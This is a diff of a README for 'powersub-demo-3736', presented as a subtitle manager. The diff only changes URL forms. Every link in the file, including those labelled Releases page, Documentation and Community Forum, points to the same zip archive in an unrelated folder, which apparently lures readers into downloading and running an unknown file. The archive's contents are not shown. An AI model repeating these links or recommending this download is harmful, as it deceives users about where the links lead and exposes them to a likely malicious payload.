@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-3736 - Effortless Subtitle Management Made Simple
 
-[![Download](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip)
+[![Download](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip%20Now-Click%20Here-blue)](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ powersub-demo-3736 is a user-friendly application designed to help you manage su
 
 To get started, visit the Releases page to download the application. Follow these steps to install and run powersub-demo-3736:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip).
+1. Go to the [Releases page](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip).
 2. Find the latest version of the application.
 3. Click on the download link for your operating system (Windows, macOS, or Linux).
 4. Once the file is downloaded, locate the file on your computer.
@@ -66,10 +66,10 @@ If you have issues or questions, please open an issue in the repository or conta
 
 Feel free to check the following links for more information:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip)
-- [Documentation](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip) - Learn more about advanced usage.
-- [Community Forum](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip) - Join discussions with other users.
+- [GitHub Repository](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip)
+- [Documentation](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip) - Learn more about advanced usage.
+- [Community Forum](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip) - Join discussions with other users.
 
-For more updates and information, remember to visit the [Releases page](https://raw.githubusercontent.com/Vinilo2025/powersub-demo-3736/main/Bouteloua/powersub-demo-3736.zip) regularly.
+For more updates and information, remember to visit the [Releases page](https://github.com/Vinilo2025/powersub-demo-3736/raw/refs/heads/main/Bouteloua/powersub-demo-3736.zip) regularly.
 
 Thank you for choosing powersub-demo-3736! Enjoy managing your subtitles effortlessly.
